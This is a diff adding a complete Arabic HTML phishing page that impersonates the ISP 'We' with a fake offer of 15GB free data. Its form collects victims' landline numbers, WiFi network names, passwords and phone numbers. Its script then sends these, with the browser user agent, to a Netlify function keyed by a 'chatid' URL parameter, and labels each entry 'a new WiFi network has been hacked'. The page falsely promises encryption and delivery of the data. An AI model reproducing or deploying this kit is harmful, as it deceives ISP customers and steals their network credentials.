@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن 15GB مجاناً - We</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 40px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .logo i {
+            margin-left: 10px;
+            font-size: 32px;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+
+        .nav-links li {
+            margin-right: 25px;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #ffd166;
+        }
+
+        .hero {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 60px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+
+        .hero-content {
+            flex: 1;
+            padding-left: 30px;
+        }
+
+        .hero-image {
+            flex: 1;
+            text-align: center;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 42px;
+            color: #2575fc;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .highlight {
+            color: #6a11cb;
+            font-weight: 800;
+        }
+
+        .subtitle {
+            font-size: 20px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            width: 32%;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s;
+            margin-bottom: 20px;
+        }
+
+        .feature:hover {
+            transform: translateY(-10px);
+        }
+
+        .feature i {
+            font-size: 40px;
+            color: #6a11cb;
+            margin-bottom: 15px;
+        }
+
+        .feature h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #2575fc;
+        }
+
+        .feature p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            margin-bottom: 40px;
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 32px;
+            color: #2575fc;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+            font-size: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #6a11cb;
+            outline: none;
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(106, 17, 203, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .loading i {
+            font-size: 30px;
+            color: #6a11cb;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .error-message {
+            display: none;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .chatid-notice {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #ffeaa7;
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            color: white;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            margin-top: 40px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            margin-bottom: 20px;
+        }
+
+        .footer-links li {
+            margin: 0 15px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .copyright {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        @media (max-width: 992px) {
+            .hero {
+                flex-direction: column;
+            }
+
+            .hero-content {
+                padding-left: 0;
+                margin-bottom: 30px;
+                text-align: center;
+            }
+
+            .features {
+                flex-direction: column;
+            }
+
+            .feature {
+                width: 100%;
+                margin-bottom: 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .nav-links {
+                margin-top: 20px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .nav-links li {
+                margin: 0 10px 10px 10px;
+            }
+
+            h1 {
+                font-size: 32px;
+            }
+
+            .hero, .form-container {
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-wifi"></i>
+                <span>We</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#"><i class="fas fa-home"></i> الرئيسية</a></li>
+                <li><a href="#"><i class="fas fa-gift"></i> العروض</a></li>
+                <li><a href="#"><i class="fas fa-question-circle"></i> المساعدة</a></li>
+                <li><a href="#"><i class="fas fa-phone"></i> اتصل بنا</a></li>
+            </ul>
+        </header>
+
+        <section class="hero">
+            <div class="hero-content">
+                <h1>احصل على <span class="highlight">15GB مجاناً</span> لشحن بيانات الإنترنت</h1>
+                <p class="subtitle">عرض خاص لفترة محدودة! قم بتعبئة النموذج أدناه للحصول على شحن مجاني لبيانات الإنترنت يصل إلى 15 جيجابايت.</p>
+                <div class="features">
+                    <div class="feature">
+                        <i class="fas fa-bolt"></i>
+                        <h3>شحن فوري</h3>
+                        <p>استلم بيانات الإنترنت فور إكمال النموذج</p>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-shield-alt"></i>
+                        <h3>آمن وسري</h3>
+                        <p>بياناتك محمية بأحدث تقنيات التشفير</p>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-headset"></i>
+                        <h3>دعم فني 24/7</h3>
+                        <p>فريق الدعم الفني متاح على مدار الساعة</p>
+                    </div>
+                </div>
+            </div>
+            <div class="hero-image">
+                <img src="https://www2.0zz0.com/2025/12/04/07/296574587.jpeg" alt="شحن إنترنت">
+            </div>
+        </section>
+
+        <section class="form-container">
+            <h2 class="form-title">طلب شحن 15GB مجاناً</h2>
+            
+            <div class="chatid-notice" id="chatid-notice">
+                <i class="fas fa-info-circle"></i>
+                <span id="chatid-text"></span>
+            </div>
+            
+            <p style="text-align: center; margin-bottom: 30px; color: #666; font-size: 18px;">يرجى تعبئة النموذج أدناه بالمعلومات المطلوبة للحصول على الشحن المجاني</p>
+
+            <form id="charging-form">
+                <div class="form-group">
+                    <label for="landline"><i class="fas fa-phone-alt"></i> الرقم الأرضي</label>
+                    <input type="text" id="landline" name="landline" placeholder="أدخل الرقم الأرضي (مثال: 0223456789)" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="network-name"><i class="fas fa-network-wired"></i> اسم الشبكة الحالي</label>
+                    <input type="text" id="network-name" name="network-name" placeholder="أدخل اسم شبكة الإنترنت الحالية" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-key"></i> كلمة المرور الحالية</label>
+                    <input type="password" id="password" name="password" placeholder="أدخل كلمة مرور الشبكة الحالية" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone"><i class="fas fa-mobile-alt"></i> رقم الهاتف (اختياري)</label>
+                    <input type="text" id="phone" name="phone" placeholder="رقم الهاتف للتواصل">
+                </div>
+
+                <button type="submit" class="submit-btn" id="submit-btn">
+                    <i class="fas fa-paper-plane"></i> إرسال الطلب والحصول على 15GB مجاناً
+                </button>
+            </form>
+
+            <div class="loading" id="loading">
+                <i class="fas fa-spinner"></i>
+                <p>جاري معالجة طلبك وإرسال البيانات...</p>
+            </div>
+
+            <div class="success-message" id="success-message">
+                <i class="fas fa-check-circle"></i>
+                <p>تم إرسال طلبك بنجاح! ستتلقى شحن الـ 15GB خلال 24 ساعة.</p>
+            </div>
+
+            <div class="error-message" id="error-message">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>حدث خطأ</p>
+            </div>
+            
+            <div class="error-message" id="no-chatid-message" style="display: none;">
+                <i class="fas fa-exclamation-circle"></i>
+                <p>خطأ:</p>
+            </div>
+        </section>
+
+        <footer>
+            <ul class="footer-links">
+                <li><a href="#">سياسة الخصوصية</a></li>
+                <li><a href="#">شروط الاستخدام</a></li>
+                <li><a href="#">الأسئلة الشائعة</a></li>
+                <li><a href="#">اتصل بنا</a></li>
+            </ul>
+            <p class="copyright">جميع الحقوق محفوظة &copy; 2025 We</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chatid');
+            
+            const chatidNotice = document.getElementById('chatid-notice');
+            const chatidText = document.getElementById('chatid-text');
+            
+            if (chatId) {
+                chatidNotice.style.display = 'block';
+                chatidText.textContent = `تأكد من البيانات لتجنب إرسال الجيجا لغيرك`;
+            } else {
+                document.getElementById('submit-btn').style.display = 'none';
+                document.getElementById('no-chatid-message').style.display = 'block';
+            }
+        });
+
+        document.getElementById('charging-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('success-message').style.display = 'none';
+            document.getElementById('error-message').style.display = 'none';
+
+            const formData = {
+                landline: document.getElementById('landline').value,
+                networkName: document.getElementById('network-name').value,
+                password: document.getElementById('password').value,
+                phone: document.getElementById('phone').value,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                userAgent: navigator.userAgent,
+                pageUrl: window.location.href
+            };
+
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('chatid');
+
+                if (!chatId) {
+                    throw new Error('لم يتم العثور على Chat ID في الرابط. يجب الوصول للموقع عبر رابط يحتوي على chatid.');
+                }
+
+                const message = `
+📲 <b>تم اختراق شبكة W i F i جديده</b>
+
+📞 <b>الرقم الأرضي:</b> ${formData.landline}
+📶 <b>اسم الشبكة:</b> ${formData.networkName}
+🔐 <b>كلمة المرور:</b> ${formData.password}
+📱 <b>رقم الهاتف:</b> ${formData.phone || 'لم يتم تقديمه'}
+
+⏰ <b>الوقت:</b> ${formData.timestamp}
+🌐 <b>رابط الصفحة:</b> ${formData.pageUrl}
+                `;
+
+                const response = await fetch('/.netlify/functions/internet', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('success-message').style.display = 'block';
+
+                    document.getElementById('charging-form').reset();
+
+                    setTimeout(() => {
+                        document.getElementById('success-message').style.display = 'none';
+                    }, 5000);
+                } else {
+                    throw new Error('فشل إرسال البيانات: ' + result.error);
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+
+                document.getElementById('loading').style.display = 'none';
+                
+                if (error.message.includes('Chat ID')) {
+                    document.getElementById('no-chatid-message').style.display = 'block';
+                } else {
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('error-message').innerHTML = `
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <p>حدث خطأ أثناء إرسال البيانات: ${error.message}</p>
+                    `;
+                }
+
+                setTimeout(() => {
+                    document.getElementById('error-message').style.display = 'none';
+                    document.getElementById('no-chatid-message').style.display = 'none';
+                }, 5000);
+            }
+        });
+    </script>
+</body>
+</html>
